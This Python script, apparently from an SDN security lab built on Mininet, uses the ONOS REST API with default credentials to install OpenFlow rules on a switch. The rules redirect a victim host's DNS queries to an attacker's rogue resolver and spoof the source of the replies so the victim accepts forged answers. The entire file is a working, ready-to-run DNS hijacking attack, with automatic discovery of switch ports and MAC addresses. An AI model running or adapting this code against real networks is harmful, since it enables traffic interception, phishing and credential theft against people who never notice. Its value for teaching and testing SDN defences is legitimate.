#!/usr/bin/env python3
"""
DNS HIJACK via ONOS OpenFlow rules  (Attack 2, SDN / control-plane method).

This is the SDN-specific core of the attack: instead of racing spoofed DNS
replies on the LAN, we tell the CONTROLLER (ONOS) to install OpenFlow 1.3
flow rules on the victim's switch that STEER the victim's DNS traffic
(UDP/53) to the attacker's rogue resolver, and quietly rewrite the reply so
the victim never notices.

It installs TWO rules on the victim's switch (s1):

  1) OUTBOUND hijack  (victim -> real resolver, UDP dst 53)
       match : ip_src=VICTIM, ip_dst=REAL_RESOLVER, udp_dst=53
       action: set eth_dst=ATTACKER_MAC, set ip_dst=ATTACKER_IP,
               output -> attacker port
     => the query is delivered to the rogue resolver instead.

  2) RETURN rewrite   (attacker -> victim, UDP src 53)
       match : ip_src=ATTACKER, ip_dst=VICTIM, udp_src=53
       action: set ip_src=REAL_RESOLVER, output -> victim port
     => the forged reply looks like it came from the real resolver, so the
        victim's OS accepts it.

Switch id, ports and the attacker MAC are discovered automatically from
ONOS's host database (so you must run 'pingall' in Mininet first, so ONOS
has learned the hosts).

Usage:
    python3 push_dns_hijack.py            # install the hijack
    python3 push_dns_hijack.py --dry-run  # just print what it would do

Config can be overridden with environment variables (see CONFIG below).
"""
import base64
import json
import os
import sys
import urllib.request
import urllib.error

# ----------------------------- CONFIG --------------------------------------
VICTIM_IP        = os.environ.get("VICTIM_IP",        "10.0.10.11")   # h1
ATTACKER_IP      = os.environ.get("ATTACKER_IP",      "10.0.10.13")   # h3
REAL_RESOLVER_IP = os.environ.get("REAL_RESOLVER_IP", "10.0.30.10")   # srv

ONOS_HOST = os.environ.get("ONOS_HOST", "127.0.0.1")
ONOS_PORT = os.environ.get("ONOS_PORT", "8181")
ONOS_USER = os.environ.get("ONOS_USER", "onos")
ONOS_PASS = os.environ.get("ONOS_PASS", "rocks")

APP_ID    = "org.sdnproject.dnshijack"   # tag so we can remove just our flows
PRIORITY  = 50000                        # beat ONOS reactive-forwarding flows
# ---------------------------------------------------------------------------

BASE = f"http://{ONOS_HOST}:{ONOS_PORT}/onos/v1"
DRY_RUN = "--dry-run" in sys.argv


def _auth_header():
    raw = f"{ONOS_USER}:{ONOS_PASS}".encode()
    return "Basic " + base64.b64encode(raw).decode()


def onos_get(path):
    req = urllib.request.Request(BASE + path)
    req.add_header("Authorization", _auth_header())
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode())


def onos_post(path, body):
    data = json.dumps(body).encode()
    req = urllib.request.Request(BASE + path, data=data, method="POST")
    req.add_header("Authorization", _auth_header())
    req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status


def find_host(hosts, ip):
    """Return (mac, deviceId, port) for the host that owns `ip`, or None."""
    for h in hosts.get("hosts", []):
        if ip in h.get("ipAddresses", []):
            # ONOS >=1.11 uses "locations" (a list); older uses "location".
            loc = (h.get("locations") or [h.get("location")])[0]
            return h["mac"], loc["elementId"], str(loc["port"])
    return None


def outbound_flow(device, attacker_mac, attacker_port):
    return {
        "priority": PRIORITY, "timeout": 0, "isPermanent": True,
        "deviceId": device,
        "treatment": {"instructions": [
            {"type": "L2MODIFICATION", "subtype": "ETH_DST", "mac": attacker_mac},
            # ONOS 2.7 wants a bare host address in a set-field action (no /32);
            # the /32 prefix is valid only in the match selector below.
            {"type": "L3MODIFICATION", "subtype": "IPV4_DST", "ip": ATTACKER_IP},
            {"type": "OUTPUT", "port": attacker_port},
        ]},
        "selector": {"criteria": [
            {"type": "ETH_TYPE", "ethType": "0x0800"},
            {"type": "IP_PROTO", "protocol": 17},
            {"type": "IPV4_SRC", "ip": VICTIM_IP + "/32"},
            {"type": "IPV4_DST", "ip": REAL_RESOLVER_IP + "/32"},
            {"type": "UDP_DST", "udpPort": 53},
        ]},
    }


def return_flow(device, victim_port):
    return {
        "priority": PRIORITY, "timeout": 0, "isPermanent": True,
        "deviceId": device,
        "treatment": {"instructions": [
            # bare host address (no /32) — see note in outbound_flow().
            {"type": "L3MODIFICATION", "subtype": "IPV4_SRC", "ip": REAL_RESOLVER_IP},
            {"type": "OUTPUT", "port": victim_port},
        ]},
        "selector": {"criteria": [
            {"type": "ETH_TYPE", "ethType": "0x0800"},
            {"type": "IP_PROTO", "protocol": 17},
            {"type": "IPV4_SRC", "ip": ATTACKER_IP + "/32"},
            {"type": "IPV4_DST", "ip": VICTIM_IP + "/32"},
            {"type": "UDP_SRC", "udpPort": 53},
        ]},
    }


def main():
    print(f"[*] ONOS   : {BASE}")
    print(f"[*] victim : {VICTIM_IP}   attacker: {ATTACKER_IP}   "
          f"real DNS: {REAL_RESOLVER_IP}")

    try:
        hosts = onos_get("/hosts")
    except urllib.error.URLError as e:
        sys.exit(f"[!] Cannot reach ONOS ({e}). Is ONOS up and port 8181 open?")

    victim   = find_host(hosts, VICTIM_IP)
    attacker = find_host(hosts, ATTACKER_IP)
    if not victim or not attacker:
        sys.exit("[!] Victim or attacker not found in ONOS hosts.\n"
                 "    Run 'pingall' in Mininet first so ONOS learns them.")

    v_mac, v_dev, v_port = victim
    a_mac, a_dev, a_port = attacker
    print(f"[*] victim   on {v_dev} port {v_port} (mac {v_mac})")
    print(f"[*] attacker on {a_dev} port {a_port} (mac {a_mac})")

    if v_dev != a_dev:
        print("[!] WARNING: victim and attacker are on different switches; "
              "this demo assumes they share one (s1).")

    device = v_dev
    flows = [
        ("OUTBOUND hijack", outbound_flow(device, a_mac, a_port)),
        ("RETURN rewrite",  return_flow(device, v_port)),
    ]

    for name, flow in flows:
        if DRY_RUN:
            print(f"\n--- {name} (dry-run) ---")
            print(json.dumps(flow, indent=2))
            continue
        status = onos_post(f"/flows/{device}?appId={APP_ID}", flow)
        print(f"[+] installed {name}: HTTP {status}")

    if not DRY_RUN:
        print(f"\n[+] DNS hijack active. Victim DNS now steered to the attacker.")
        print(f"    Remove with:  python3 remove_dns_hijack.py")


if __name__ == "__main__":
    main()
